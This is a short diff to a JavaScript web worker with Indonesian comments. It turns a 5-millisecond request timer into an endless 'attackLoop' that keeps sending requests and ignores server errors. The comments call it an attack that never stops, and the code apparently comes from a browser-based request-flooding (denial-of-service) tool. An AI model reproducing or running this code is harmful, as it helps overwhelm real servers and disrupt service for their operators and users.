@@ -6,5 +6,10 @@ self.onmessage = function(event) {
             .catch(() => {}); // Abaikan error jika server menolak request
     }
 
-    setInterval(sendRequest, 5); // Kirim request setiap 5ms (Super cepat)
+    function attackLoop() {
+        sendRequest();
+        setTimeout(attackLoop, 5); // Loop terus tanpa berhenti
+    }
+
+    attackLoop(); // Mulai serangan tanpa henti
 };
